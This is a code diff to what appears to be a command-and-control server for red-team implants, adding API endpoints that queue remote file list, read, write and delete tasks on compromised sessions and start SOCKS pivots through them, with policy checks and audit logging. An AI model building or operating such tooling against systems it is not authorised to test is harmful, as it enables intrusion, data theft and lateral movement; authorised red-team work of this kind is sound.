@@ -93,6 +93,21 @@ class ShellCommand(BaseModel):
     idle_sec: float = 0.45
 
 
+class FileOpRequest(BaseModel):
+    session_id: str
+    op: str  # list | read | write | delete
+    path: str = ""
+    content: str | None = None
+    content_b64: str | None = None
+    hitl_request_id: str | None = None
+
+
+class SocksStart(BaseModel):
+    session_id: str
+    listen_host: str = "127.0.0.1"
+    listen_port: int = 0
+
+
 class BeaconIn(BaseModel):
     session_id: str | None = None
     hostname: str | None = None
@@ -659,6 +674,102 @@ def build_api_router() -> APIRouter:
             raise HTTPException(400, str(e)) from e
         await state.metrics.incr("payloads.generated")
         return result
+
+    # ----- File ops (structured tasks) -----
+
+    @api.post("/files/op")
+    async def file_op(
+        body: FileOpRequest,
+        request: Request,
+        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
+    ) -> dict[str, Any]:
+        """Queue structured file op task on a session (implant executes)."""
+        state = get_state(request)
+        op = (body.op or "").strip().lower()
+        cmd = f"file:{op}"
+        args: dict[str, Any] = {"path": body.path}
+        if body.content is not None:
+            args["content"] = body.content
+        if body.content_b64 is not None:
+            args["content_b64"] = body.content_b64
+        decision = await state.policy.check_and_audit(
+            auth,
+            "files.upload" if op == "write" else "files.download",
+            resource=body.session_id,
+            extra={"hitl_request_id": body.hitl_request_id, "command": cmd, "path": body.path},
+        )
+        if not decision.allowed:
+            raise _policy_http_error(decision)
+        try:
+            return await state.tasks.create(
+                session_id=body.session_id,
+                command=cmd,
+                args=args,
+                created_by=auth.name,
+            )
+        except KeyError as e:
+            raise HTTPException(404, str(e)) from e
+        except ValueError as e:
+            raise HTTPException(400, str(e)) from e
+
+    # ----- SOCKS pivot -----
+
+    @api.get("/pivot/socks")
+    async def list_socks(
+        request: Request,
+        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
+    ) -> dict[str, Any]:
+        socks = get_state(request).socks
+        return {"pivots": socks.list() if socks else []}
+
+    @api.post("/pivot/socks")
+    async def start_socks(
+        body: SocksStart,
+        request: Request,
+        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
+    ) -> dict[str, Any]:
+        state = get_state(request)
+        if not state.socks:
+            raise HTTPException(503, "SOCKS broker unavailable")
+        decision = await state.policy.check_and_audit(
+            auth, "shell.interact", resource=body.session_id, extra={"command": "socks:start"}
+        )
+        if not decision.allowed:
+            raise _policy_http_error(decision)
+        pivot = await state.socks.start(
+            body.session_id, listen_host=body.listen_host, listen_port=body.listen_port
+        )
+        # Queue implant task
+        try:
+            await state.tasks.create(
+                session_id=body.session_id,
+                command="socks:start",
+                args={"pivot_id": pivot["id"], "port": pivot["listen_port"]},
+                created_by=auth.name,
+            )
+        except Exception:
+            pass
+        await state.db.audit(
+            actor=auth.name,
+            actor_type=auth.actor_type,
+            action="pivot.socks.start",
+            resource=body.session_id,
+            details={"pivot_id": pivot["id"], "port": pivot["listen_port"]},
+            risk_score=7,
+        )
+        return pivot
+
+    @api.delete("/pivot/socks/{pivot_id}")
+    async def stop_socks(
+        pivot_id: str,
+        request: Request,
+        auth: AuthContext = Depends(require_scope("shell:interact", "admin")),
+    ) -> dict[str, str]:
+        state = get_state(request)
+        ok = await state.socks.stop(pivot_id) if state.socks else False
+        if not ok:
+            raise HTTPException(404, "pivot not found")
+        return {"status": "stopped", "id": pivot_id}
 
     # ----- Shell interact -----
 
